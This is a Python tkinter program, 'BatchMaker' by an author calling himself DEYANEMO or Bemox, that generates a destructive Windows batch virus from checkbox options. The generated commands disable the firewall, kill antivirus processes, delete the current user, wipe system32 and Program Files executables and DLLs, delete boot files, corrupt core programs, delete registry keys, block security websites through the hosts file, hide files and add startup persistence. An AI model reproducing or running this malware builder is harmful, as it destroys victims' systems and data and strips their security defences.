from tkinter import *
from tkinter import ttk
from tkinter import messagebox 
import os
"""
# Disclamer : 

[!] This version is free of charge opensource script 

[!] hope you like it and improve it with your awesome ideas 

[!] you are allowed to modifiy it with only one condition 

[!] keeping the Auther Name : DEYANEMO....Or....Bemox 

[!] Thank you and have fun ! 

[!] am not responsable for any damage the accure... 

[!] use it wisely.....


[!] best DeYaNeMo .... BeMox 


[!] For more information : Idont have a website :D 



"""
os.system('color e')
print("          (             )           )       *       )  ")
print("          )\ )       ( /(  (     ( /(     (  `   ( /(   ")
print("         (()/(  (    )\()) )\    )\())(   )\))(  )\())  ")
print("          /(_)) )\  ((_)((((_)( ((_)\ )\ ((_)()\((_)\   ")
print("         (_))_ ((_)__ ((_)\ _ )\ _((_|(_)(_()((_) ((_)  ")
print("         |   \| __\ \ / (_)_\(_) \| | __|  \/  |/ _ \  ")
print("         | |) | _| \ V / / _ \ | .` | _|| |\/| | (_) | ")
print("         |___/|___| |_| /_/ \_\|_|\_|___|_|  |_|\___/  ")
print("      [~/         WeLcOmE To BatchMaker Ver 1.0        \~]")
print("      [~/  [C]    Author : DEYANEMO AKA BeMox          \~]")
print("      [~/  [E]    deyanemo@gmail.com                  \~]")
print("      [~/  [i]    Al-Salam Alekum wa rahmatu Allah    \~]")
print("      [~/  [i]    Freedom TO SyRiA *** Greetz to All  \~]")
print("       .```````````:dMMMMMMMd+.```:yNMMMMMMNo````````````")
print("       `````````````-odMMMMMMMN``oMMMMMMMNy:`````````````")
print("       ````````````````-odMMMMN``oMMMMNy:````````````````")
print("        ```````````/+-`````-odMN``oMNy:`````.//```````````")
print("        ````````.oNMMMms/`````-+``::`````-odMMMNs.````````")
print("        ```````oNMMMMMMMMNh+-````````./yNMMMMMMMMNs```````")
print("        `````-dMMMMMMMMMMMMMMms:``-odMMMMMMMMMMMMMMm:`````")
print("        ````:NMMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMMMMMMMM/````")
print("        ```-NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/```")
print("        ```mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.``")
print("        ``+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs``")
print("        ``dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN``")
print("        ``NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.`")
print("          ##################~~DEYANEMO~~##################")

# THE START we must create the file
def deyan(event):
	# theName =  StringVar()
	# theName = "BEMOX.bat"
# Make Random Directory
	if che1.get():
		print("true")
		print(che1.get())
		too = int(w.get())
		for i in range(1 , too):
			det = open("Bemox.bat","a")
			det.write("@echo off \n")
			det.write("mkdir %random% \n")
			det.close()
	else:
		print("false")
		print(che1.get())
#########################
#Make UndeleteAble Random Directory
	if che2.get():
		too = int(w.get())
		print("true")
		print("Creatin Folders :" , too)
		for d in range(1 , too):
			det = open("Bemox.bat","a")
			det.write("@echo off \n")
			det.write("mkdir\\.\c:\%RANDOM%\con \n")
			det.close()
	else:
		print("false")
#########################
#Disable The Fire Wall
	if che3.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("netsh firewall opmode disable \n")
		det.close()
	else:
		print("false")
#########################
#Delete The Current User
	if che4.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("net user %username% /del \n")
		det.close()
	else:
		print("false")
#########################
#Stop all Antiviruses
	if che5.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("net user %username% /del \n")
		det.write("net stop 'Security Center' \n")
		det.write("netsh firewall set opmode mode=disable \n")
		det.write("tskill /A av* \n")
		det.write("tskill /A fire* \n")
		det.write("tskill /A anti* \n")
		det.write("tskill /A spy* \n")
		det.write("tskill /A bullguard \n")
		det.write("tskill /A PersFw \n")
		det.write("tskill /A PersFw \n")
		det.write("tskill /A KAV* \n")
		det.write("tskill /A ZONEALARM \n")
		det.write("tskill /A SAFEWEB \n")
		det.write("tskill /A OUTPOST \n ")
		det.write("tskill /A nv* \n")
		det.write("tskill /A nav* \n")
		det.write("tskill /A F-* \n ")
		det.write("tskill /A ESAFE \n ")
		det.write("tskill /A cle \n")
		det.write("tskill /A BLACKICE \n")
		det.close()
	else:
		print("false")
#########################
#Stop The Mouse 
	if che6.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("rundll32.exe mouse,disable \n")
		det.close()
	else:
		print("false")
#########################
#Stop The Keyboard 
	if che7.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("rundll32 keyboard,disable  \n")
		det.close()
	else:
		print("false")
#########################
#Stop all ProgramFiles
	if che8.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("del /f /s /q %programfiles%\*.dll \n")
		det.write("del /f /s /q %programfiles%\*.inf \n")
		det.write("del /f /s /q %programfiles%\*.ini \n")
		det.write("del /f /s /q %programfiles%\*.exe \n")
		det.close()
	else:
		print("false")

#########################
#Start On StartUP
	if che9.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("echo [windows]>> %windir%\win.ini \n")
		det.write("echo path c:\\boot.bat >> %windir%\win.ini \n")
		det.write("set deyanemo=c:\\boot.bat\nreg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run /v Boot /t REG_SZ /d deyanemo /f \n")
		det.write("set deyanemo=c:\\boot.bat \n")
		det.write("reg add HKEY_LOCAL_MACHINE\SOFTWAREMicrosoft\Windows\CurrentVersion\Run /v Explorer /t REG_SZ /d deyanemo /f \n")
		det.write("echo start c:\\boot.bat >> %systemdrive%\\autexec.bat \n")
		det.close()
	else:
		print("false")
#########################
#Stop all Antiviruses Websites
	if che10.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("echo 127.0.0.1 www.virustotal.com >> %windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.jotti.org>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.trendmicro.com>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.novirusthanks.org>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.avira.com>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.avg.com>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.norton.com>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.symantec.com>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.nod32.com>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.eset.com>>%windir%\System32\drivers\etc\hosts \n")
		det.write("echo 127.0.0.1 www.google.com>>%windir%\System32\drivers\etc\hosts \n")
		det.close()
	else:
		print("false")

#########################
# Flood The Network 
	if che11.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("net send * WORKGROUP ENABLED \n")
		det.write("net send * WORKGROUP ENABLED \n")
		det.close()
	else:
		print("false")
#########################
# Stop all Conn 
	if che12.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("ipconfig /release_all \n")
		det.close()
	else:
		print("false")
#########################
# Hide the Virus
	if che13.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("attrib c:\*.bat +s +h +a +r \n")
		det.write("attrib d:\*.bat +s +h +a +r \n")
		det.write("attrib e:\*.bat +s +h +a +r \n")
		det.write("attrib f:\*.bat +s +h +a +r \n")
		det.write("attrib h:\*.bat +s +h +a +r \n")
		det.write("attrib i:\*.bat +s +h +a +r \n")
		det.write("attrib g:\*.bat +s +h +a +r \n")
		det.write("attrib l:\*.bat +s +h +a +r \n")
		det.write("attrib m:\*.bat +s +h +a +r \n")
		det.close()
	else:
		print("false")
#########################
# Stop all This Programs

	if che14.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\explorer.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %programfiles%\Internet Explorer\iexplore.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %programfiles%\Mozilla Firefox\\firefox.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\command.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32cmd.exe \n")
		det.write("echoViRus_By_DEYANEMO >> %windir%\\regedit.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\\taskmgr.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\\taskmgr.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %programfiles%\windows live\Messenger\msnmsgr.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\\notepad.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\wordpad.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\control.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\winlogon.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\\rundll32.exe \n")
		det.close()
	else:
		print("false")
#########################
# Delete All System Files

	if che15.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("del /s /f /q %windir%\system32\*.dll \n")
		det.write("del /s /f /q %windir%\*.dll \n")
		det.write("del /s /f /q %windir%\system32\*.cpl \n")
		det.write("del /s /f /q %windir%\*.cpl \n")
		det.write("del /s /f /q %windir%\system32\*.exe \n")
		det.write("del /s /f /q %windir%\*.exe \n")
		det.write("del /s /f /q %systemdrive%\*.exe \n")
		det.write("del /s /f /q %systemdrive%\*.sys \n")
		det.write("del /s /f /q %systemdrive%\*.ini \n")
		det.write("del /s /f /q %windir%\*.ini \n")
		det.write("del /s /f /q %windir%\system32\*.ini \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\control.exe \n")
		det.write("echo ViRus_By_DEYANEMO >> %windir%\system32\winlogon.exe \n")
		det.write("del /s /f /q %systemdrive%\*.ini \n")
		det.close()
	else:
		print("false")
#########################
# Crash pc For Ever 
	if che16.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("@echo off \n")
		det.write("attrib -r -s -h c:\\autoexec.bat \n")
		det.write("del c:\\autoexec.bat \n")
		det.write("del c:\\boot.ini \n")
		det.write("del c:\\ntldr \n")
		det.write("attrib -r -s -h c:\windows\win.ini \n")
		det.write("del c:\windows\win.ini \n")
		det.close()
	else:
		print("false")
#########################
# Delte all registery 
	if che17.get():
		print("true")
		det = open("Bemox.bat","a")
		det.write("@echo off \n")
		det.write("start reg delete HKCR/.exe \n")
		det.write("start reg delete HKCR/.dll \n")
		det.write("start reg delete HKCR/* \n")
		det.close()
	else:
		print("false")

# THE ENd Of This fucntion
# The Root Options
root = Tk()
root.title("DeYaNeMo | Bemox Batch Maker" )
root.geometry("600x600+400+200")
style = ttk.Style()
style.theme_use('alt')
# frame = Frame(root)
# Label(frame , text="Hello There ! ").pack()
# Button(frame , text="Click Me ").pack(side=LEFT , fill=Y)
# Button(frame , text="Click Me 1").pack(side=TOP , fill=X)
# Button(frame , text="Click Me 2").pack(side=RIGHT , fill=Y)
# Button(frame , text="Click Me 3").pack(side=BOTTOM , fill=X)
# frame.pack()
# The Checkboxes Variables 
che1 = BooleanVar()
che2 = BooleanVar()
che3 = BooleanVar()
che4 = BooleanVar()
che5 = BooleanVar()
che6 = BooleanVar()
che7 = BooleanVar()
che8 = BooleanVar()
che9 = BooleanVar()
che10 = BooleanVar()
che11 = BooleanVar()
che12 = BooleanVar()
che13 = BooleanVar()
che14 = BooleanVar()
che15 = BooleanVar()
che16 = BooleanVar()
che17 = BooleanVar()



# The CheckBoxes
l = Label(root, text="How Many Folders You Want ? 1- 200").pack()
w = Scale(root, from_=20, to=200, orient=HORIZONTAL)
w.pack()
check1 = Checkbutton(root ,variable=che1 , text="Make Random Directory").pack(expand=NO, fill=NONE)
check2 = Checkbutton(root ,variable=che2, text="Make UnDeleteAble Directory").pack(expand=NO, fill=NONE)
check3 = Checkbutton(root ,variable=che3, text="Disable The Fire Wall").pack()
check4 = Checkbutton(root ,variable=che4, text="Delete The Current User" ).pack()
check5 = Checkbutton(root ,variable=che5, text="Stop all Antiviruses" ).pack()
check6 = Checkbutton(root ,variable=che6, text="Stop The Mouse" ).pack()
check7 = Checkbutton(root ,variable=che7, text="Stop The Keyboard" ).pack()
check8 = Checkbutton(root ,variable=che8, text="Stop all The programFiles " ).pack()
check9 = Checkbutton(root ,variable=che9, text="Start on startup " ).pack()
check10 = Checkbutton(root ,variable=che10, text="Stop all the antivirus website " ).pack()
check11 = Checkbutton(root ,variable=che11, text="Flood The Network" ).pack()
check12 = Checkbutton(root ,variable=che12, text="Stop All Connections" ).pack()
check13 = Checkbutton(root ,variable=che13, text="Hide the Virus " ).pack()
check14 = Checkbutton(root ,variable=che14, text="Stop all This Programs explore winlogin ...." ).pack()
check15 = Checkbutton(root ,variable=che15, text="Delete All The System Files" ).pack()
check16 = Checkbutton(root ,variable=che16, text="Delte all registery " ).pack()
check17 = Checkbutton(root ,variable=che17, text="Crash pc For Ever" ).pack()
ThErights = Label(root , text="~ [ All rights reseved to DeyaneMo 2012 - 2017 ] ~").pack(fill=Y)
ThErights2 = Label(root , text="~[ Yl3an Ruhak Ya Hafez ] ~").pack(fill=Y)
ThErights3 = Label(root , text="~ [God Bless SyriaFreedom To Syria] ~").pack(fill=Y)
ThErights3 = Label(root , text="~ [AlHamdu li Allah] ~").pack(fill=Y)

# THe Buttons
btn1 = Button(root, text="Produce The Batch")
btn1.bind("<Button-1>", deyan)
btn1.pack(side=BOTTOM)




root.mainloop()

